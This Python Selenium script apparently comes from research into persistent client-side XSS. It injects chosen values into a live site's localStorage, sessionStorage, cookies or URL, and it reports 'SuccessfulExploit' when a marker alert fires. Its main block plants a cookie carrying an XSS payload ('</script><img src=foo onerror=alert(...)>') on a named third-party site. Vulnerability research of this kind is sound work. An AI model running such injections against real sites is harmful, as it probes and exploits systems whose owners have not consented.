# Ref: https://stackoverflow.com/questions/45500606/set-chrome-browser-binary-through-chromedriver-in-python
# Ref: https://stackoverflow.com/questions/46361494/how-to-get-the-localstorage-with-python-and-selenium-webdriver


from selenium import webdriver
# from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox.options import Options

from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

from random import sample

class LocalStorage:

    def __init__(self, driver) :
        self.driver = driver

    def __len__(self) :
        return self.driver.execute_script("return window.localStorage.length;")

    def items(self) :
        return self.driver.execute_script( \
            "var ls = window.localStorage, items = {}; " \
            "for (var i = 0, k; i < ls.length; ++i) " \
            "  items[k = ls.key(i)] = ls.getItem(k); " \
            "return items; ")

    def keys(self) :
        return self.driver.execute_script( \
            "var ls = window.localStorage, keys = []; " \
            "for (var i = 0; i < ls.length; ++i) " \
            "  keys[i] = ls.key(i); " \
            "return keys; ")

    def get(self, key):
        return self.driver.execute_script("return window.localStorage.getItem(arguments[0]);", key)

    def set(self, key, value):
        self.driver.execute_script("window.localStorage.setItem(arguments[0], arguments[1]);", key, value)

    def has(self, key):
        return key in self.keys()

    def remove(self, key):
        self.driver.execute_script("window.localStorage.removeItem(arguments[0]);", key)

    def clear(self):
        self.driver.execute_script("window.localStorage.clear();")

    def __getitem__(self, key) :
        value = self.get(key)
        if value is None :
          raise KeyError(key)
        return value

    def __setitem__(self, key, value):
        self.set(key, value)

    def __contains__(self, key):
        return key in self.keys()

    def __iter__(self):
        return self.items().__iter__()

    def __repr__(self):
        return self.items().__str__()


class SessionStorage:

    def __init__(self, driver) :
        self.driver = driver

    def __len__(self) :
        return self.driver.execute_script("return window.sessionStorage.length;")

    def items(self) :
        return self.driver.execute_script( \
            "var ls = window.sessionStorage, items = {}; " \
            "for (var i = 0, k; i < ls.length; ++i) " \
            "  items[k = ls.key(i)] = ls.getItem(k); " \
            "return items; ")

    def keys(self) :
        return self.driver.execute_script( \
            "var ls = window.sessionStorage, keys = []; " \
            "for (var i = 0; i < ls.length; ++i) " \
            "  keys[i] = ls.key(i); " \
            "return keys; ")

    def get(self, key):
        return self.driver.execute_script("return window.sessionStorage.getItem(arguments[0]);", key)

    def set(self, key, value):
        self.driver.execute_script("window.sessionStorage.setItem(arguments[0], arguments[1]);", key, value)

    def has(self, key):
        return key in self.keys()

    def remove(self, key):
        self.driver.execute_script("window.sessionStorage.removeItem(arguments[0]);", key)

    def clear(self):
        self.driver.execute_script("window.sessionStorage.clear();")

    def __getitem__(self, key) :
        value = self.get(key)
        if value is None :
          raise KeyError(key)
        return value

    def __setitem__(self, key, value):
        self.set(key, value)

    def __contains__(self, key):
        return key in self.keys()

    def __iter__(self):
        return self.items().__iter__()

    def __repr__(self):
        return self.items().__str__()


class Cookies:
    def __init__(self, driver):
        self.driver = driver

    def change_cookie(self, cookie_name, new_value):
        """
        change cookie[name] to a new value
        Ref: https://sqa.stackexchange.com/questions/42232/pythonseleniumunittest-get-website-cookie-manipulate-cookie-send-back-possib
        """
        script = """
        function manipulate_cookie(cookie_name, new_value){
            var key_value_pairs = document.cookie.split(";")
            var cookies = {}
            for(kv_pair of key_value_pairs){
                cookies[kv_pair.split("=")[0]] = kv_pair.split("=")[1]
            }
            if(cookies[cookie_name])
                cookies[cookie_name] = new_value

            var new_cookies = []
            for(cookie in cookies){
                new_cookies.push(`${cookie}=${cookies[cookie]}`)
            }
            return  new_cookies.join(";")
        }document.cookie = manipulate_cookie(arguments[0], arguments[1])
        """
        self.driver.execute_script(script, cookie_name, new_value)


def double_check(domain, source_type, key, value):
    if not len(key) or not len(value):
        return -1
    options = Options()
    # options.binary_location = root_path + "chrome"
    # options.binary_location = root_path + "out/Bytecode/chrome"
    options.add_argument("--no-sandbox")
    options.headless = True
    with webdriver.Firefox(options=options, executable_path="/media/data1/zfk/geckodriver") as driver:

        url = domain #'http://' + 
        try:
            driver.set_page_load_timeout(30)
            driver.get(url)
        
            if 'localStorage' in source_type:
                # set the local storage
                localstorage = LocalStorage(driver)
                localstorage[key] = value
                driver.refresh()
            elif 'sessionStorage' in source_type: 
                sessionstorage = SessionStorage(driver)
                sessionstorage[key] = value
                driver.refresh()
            elif 'cookie' in source_type:
                # set cookie
                # driver.add_cookie({"name": key, "value": value})
                # driver.refresh()
                new_cookie = Cookies(driver)
                new_cookie.change_cookie(key, value)
                driver.refresh()
                if not driver.get_cookie(key):
                    print url, source_type, key, value, "cookie not set! "
            elif 'url' in source_type or 'URL' in source_type:
                # try:
                driver.get(value)
                # except Exception as e: #(TimeoutException, WebDriverException)
                #     print url, 'has exception: ',  e
                #     return 'NotLoaded'
            else:
                print url + ' has source_type: ' + source_type
                return 'UnsupportedType'

        except Exception as e: #(TimeoutException, WebDriverException)
            print url, 'has exception: ',  e
            return 'NotLoaded'
        
        counter = 0
        while counter < 3:
            counter += 1
            try:
                WebDriverWait(driver, 10).until(EC.alert_is_present(),
                                            'Timed out waiting for PA creation ' +
                                            'confirmation popup to appear.')

                alert = driver.switch_to.alert
                if alert.text == '9780':
                    return 'SuccessfulExploit'
                else:
                    alert.accept()
            except TimeoutException:
                continue
        return 'NoExploit'
            

if __name__ == "__main__":
    root_path = "/media/data1/zfk/Documents/persistent-clientside-xss/taintchrome/chrome/"
    # root_path = "/media/data1/zfk/Documents/sanchecker/src/"
    options = Options()
    # options.binary_location = root_path + "chrome"
    # options.binary_location = root_path + "out/Bytecode/chrome"
    options.add_argument("--no-sandbox")
    options.headless = True
    # options.add_argument("--disable-dev-shm-usage")
    # options.add_argument("--disable-gpu")
    

    # with webdriver.Chrome(options=options, executable_path=root_path + "chromedriver") as driver: 
    with webdriver.Firefox(options=options, executable_path="/media/data1/zfk/geckodriver") as driver:

        url = 'http://www.google.com/'
        url = "http://images.sohu.com/bill/jingzhun/2017/baidu/juxinggengxin.html"
        driver.get(url)

        # get the local storage
        localstorage = LocalStorage(driver)
        sessionstorage = SessionStorage(driver)

        # set cookie
        cookie_key = 'vuid'
        cookie_value = 'pl346262568.1222667869</script><img src=foo onerror=alert(document.domain) onload=alert(document.domain)><textarea>'
        # driver.add_cookie({"name": cookie_key, "value": cookie_value})
        # print driver.get_cookie(cookie_key)["value"]
        new_cookie = Cookies(driver)
        new_cookie.change_cookie(cookie_key, cookie_value)
        print driver.get_cookie(cookie_key)["value"]
        driver.refresh()
        print driver.get_cookie(cookie_key)["value"]
        driver.execute_script("alert(9780);")
        # for entry in driver.get_log('browser'):
        #     print(entry)
        try:
            WebDriverWait(driver, 5).until(EC.alert_is_present(),
                                        'Timed out waiting for PA creation ' +
                                        'confirmation popup to appear.')

            alert = driver.switch_to.alert
            print alert.text
            alert.accept()
            
        except TimeoutException:
            print "no alert"